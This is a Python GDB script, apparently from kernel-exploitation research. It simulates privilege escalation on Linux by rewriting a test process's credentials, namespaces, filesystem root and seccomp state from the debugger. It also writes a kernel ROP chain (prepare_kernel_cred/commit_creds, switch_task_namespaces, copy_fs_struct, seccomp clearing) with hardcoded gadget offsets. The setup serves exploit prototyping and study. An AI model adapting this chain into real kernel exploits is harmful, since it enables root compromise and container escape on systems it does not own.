import gdb
import sys

from typing import List

sys.path.insert(0, "/root/scripts")

from lkd.context_bp import GenericContextBP
from lkd.utils import current_pt_regs

# keep in sync with user mode program
FLAG_c: int = 1 << 0
FLAG_m: int = 1 << 1
FLAG_f: int = 1 << 2
FLAG_p: int = 1 << 3
FLAG_s: int = 1 << 4
FLAG_r: int = 1 << 5
FLAG_n: int = 1 << 6
FLAG_u: int = 1 << 7


def update_cred() -> None:
    # become the root user with a full set of caps in the current namespace
    gdb.execute("set (*$lx_current().cred).uid.val = 0")
    gdb.execute("set (*$lx_current().cred).gid.val = 0")
    gdb.execute("set (*$lx_current().cred).euid.val = 0")
    gdb.execute("set (*$lx_current().cred).egid.val = 0")
    gdb.execute(
        "set (*$lx_current().cred).cap_inheritable.cap = {0xffffffff, 0x1ff}"
    )
    gdb.execute(
        "set (*$lx_current().cred).cap_bset.cap = {0xffffffff, 0x1ff}"
    )
    gdb.execute(
        "set (*$lx_current().cred).cap_permitted.cap = {0xffffffff, 0x1ff}"
    )
    gdb.execute(
        "set (*$lx_current().cred).cap_effective.cap = {0xffffffff, 0x1ff}"
    )
    gdb.execute(
        "set (*$lx_current().cred).cap_ambient.cap = {0xffffffff, 0x1ff}"
    )


def prepare_setns() -> None:
    # change mount namespace to facilitate setns
    gdb.execute(
        "set $lx_current().nsproxy.mnt_ns = init_nsproxy.mnt_ns"
    )


def update_fs() -> None:
    # change to root filesystem context
    gdb.execute(
        "set $lx_current().fs.root = init_fs.root"
    )
    gdb.execute(
        "set $lx_current().fs.pwd = init_fs.pwd"
    )


def disable_seccomp() -> None:
    # define TIF_SECCOMP		8
    gdb.execute("set $lx_current().thread_info.flags &= ~(1 << 8)")
    gdb.execute(
        "set $lx_current().seccomp.mode = 0"
    )


def update_pid_ns() -> None:
    # makes system very unstable, probably because parent is in pid
    # namespace _below_ children which is weird when they die
    gdb.execute(
        "set $lx_current().nsproxy.pid_ns_for_children = "
        "$lx_current().parent.parent.parent.nsproxy.pid_ns_for_children"
    )


def trigger_rop() -> None:
    print("Obtain saved user context")
    regs: gdb.Value = current_pt_regs()

    print("Getting addresses of gadgets and symbols")
    kernel_base: int = int(gdb.parse_and_eval("(unsigned long)startup_64"))
    find_task_by_vpid: int = int(gdb.parse_and_eval("(unsigned long)find_task_by_vpid"))
    switch_task_namespaces: int = int(gdb.parse_and_eval("(unsigned long)switch_task_namespaces"))
    prepare_kernel_cred: int = kernel_base + 0x102BE0
    commit_creds: int = kernel_base + 0x102820
    bpf_get_current_task: int = kernel_base + 0x1CFC70
    init_fs: int = kernel_base + 0x1580380
    init_nsproxy: int = int(gdb.parse_and_eval("(unsigned long)&init_nsproxy"))
    copy_fs_struct: int = kernel_base + 0x326220
    swapgs_restore_regs_and_return_to_usermode: int = (
        kernel_base + 0xC00EF0
    )

    pop_rdi_ret: int = 0x5C0 + kernel_base
    add_rax_rdi_ret: int = 0x15B0D6 + kernel_base
    push_rax_pop_rbx_ret: int = 0xF757F + kernel_base
    mov_qword_ptr_rbx_rax_pop_rbx_ret: int = 0x1084 + kernel_base
    ret: int = kernel_base + 0x1EC
    add_rcx_rbx_mov_rax_rcx_pop_rbx_ret: int = kernel_base + 0x56457
    pop_rcx_ret: int = kernel_base + 0x14041
    add_rdi_rcx_mov_rax_rdi_ret: int = kernel_base + 0x65811
    push_rax_pop_rdi_retf: int = kernel_base + 0x14c3ac
    pop_rsi_ret: int = kernel_base + 0x7c0
    mov_dword_ptr_rax_0_ret: int = kernel_base + 0x40e77

    # become root user in root user namespace
    rop_creds: List[int] = [
        pop_rdi_ret,
        0,
        prepare_kernel_cred,                # rax = prepare_kernel_cred(0)
        push_rax_pop_rbx_ret,               # rax->rbx->rcx->rdi
        pop_rdi_ret,
        0,
        pop_rcx_ret,
        0,
        add_rcx_rbx_mov_rax_rcx_pop_rbx_ret,
        -1,
        add_rdi_rcx_mov_rax_rdi_ret,
        commit_creds,                       # commit_creds(prepare_kernel_cred(0))
    ]

    # prepare for setns("/proc/1/ns/")
    rop_setns: List[int] = [
        pop_rdi_ret,
        1,
        find_task_by_vpid,                  # rax = find_task_by_vpid(1)
        push_rax_pop_rbx_ret,               # rax->rbx->rcx->rdi
        pop_rdi_ret,
        0,
        pop_rcx_ret,
        0,
        add_rcx_rbx_mov_rax_rcx_pop_rbx_ret,
        -1,
        add_rdi_rcx_mov_rax_rdi_ret,
        pop_rsi_ret,                        # rsi = &init_nsproxy
        init_nsproxy,
        switch_task_namespaces,             # switch_task_namespaces(find_task_by_vpid(1), &init_nsproxy)
    ]

    # change to root filesystem context
    rop_fs: List[int] = [
        bpf_get_current_task,               # rax = current
        pop_rdi_ret,
        0x6E0,                              # rdi = offsetof(struct task_struct, fs)
        add_rax_rdi_ret,
        push_rax_pop_rbx_ret,               # rbx = &current->fs ; callee saved
        pop_rdi_ret,
        init_fs,
        copy_fs_struct,                     # rax = copy_fs_struct(&init_fs)
        mov_qword_ptr_rbx_rax_pop_rbx_ret,  # current->fs = copy_fs_struct(&init_fs)
        -1,
    ]

    # disable seccomp
    # note: current->seccomp.mode = 0 is required to preserve disabling across forks
    # https://elixir.bootlin.com/linux/v5.10.127/source/kernel/fork.c#L1637
    rop_seccomp: List[int] = [
        bpf_get_current_task,               # rax = current
        mov_dword_ptr_rax_0_ret,            # current->thread_info->flags = 0
        pop_rdi_ret,
        0x768,                              # rdi = offsetof(struct task_struct, seccomp)
        add_rax_rdi_ret,                    # rax = &current->seccomp.mode
        mov_dword_ptr_rax_0_ret,            # current->seccomp.mode = 0
    ]

    # return to user mode
    rop_iret: List[int] = [
        # Can set more register when not returning to offset but who cares?
        swapgs_restore_regs_and_return_to_usermode + 22,
        int(regs["di"]), # Those registers will be correctly restored.
        -1,              # junk
        int(regs["si"]), # will become rip, was set to &return_to_here
        int(regs["cs"]),
        int(regs["flags"]),
        int(regs["sp"]),
        int(regs["ss"]),
    ]

    rop: List[int] = rop_seccomp + rop_creds + rop_setns + rop_iret
    # normal user code does not expect syscall to clobber all registers
    # user space will likely segfault at some point after we return to
    # it
    # expoits can:
    #   - return to code that is aware of that fact and does not assume
    #     anything about registers (e.g. function with no args ...)
    #   - pivot stack to saved pt_regs and only then jump into
    #     interrupt return
    #   - resume syscall execution

    print("Write ROP chain")
    rop_start: int = int(gdb.parse_and_eval("$rsp - 0x1000"))
    sp: int = rop_start
    for item in rop:
        cmd = f"set *(unsigned long*){hex(sp)} = {hex(item)}"
        print(cmd)
        gdb.execute(cmd)
        sp += 8

    print("Setting IP and SP")
    gdb.execute(f"set $rip = {ret}")
    gdb.execute(f"set $rsp = {rop_start}")

    gdb.Breakpoint("*prepare_kernel_cred+524", temporary=True)
    gdb.Breakpoint("*commit_creds+518", temporary=True)
    gdb.Breakpoint("*copy_fs_struct+144", temporary=True)
    gdb.Breakpoint("*common_interrupt_return+22", temporary=True)
    gdb.Breakpoint("switch_task_namespaces", temporary=True)


class DummyBP(GenericContextBP):
    def _stop(self) -> bool:
        flags: gdb.Value = gdb.parse_and_eval("regs->di")

        print(f"flags: {hex(flags)}")

        if flags & (1 << 31):
            if flags & FLAG_r:
                print("FLAG_r: Trigger ROP")
                trigger_rop()
            if flags & FLAG_c:
                print("FLAG_c: Update cred")
                update_cred()
            if flags & FLAG_m:
                print("FLAG_m: Update fs context")
                update_fs()
            if flags & FLAG_s:
                print("FLAG_s: Disable seccomp")
                disable_seccomp()
            if flags & FLAG_p:
                print("FLAG_p: Update pid ns")
                update_pid_ns()
            if flags & FLAG_u:
                print("FLAG_u: Prepare setns")
                prepare_setns()

            return True
        else:
            return False


def main() -> None:
    _dummyBp: DummyBP = DummyBP("__x64_sys_accept", comm="test_privesc")

    gdb.execute("c")


if __name__ == "__main__":
    main()
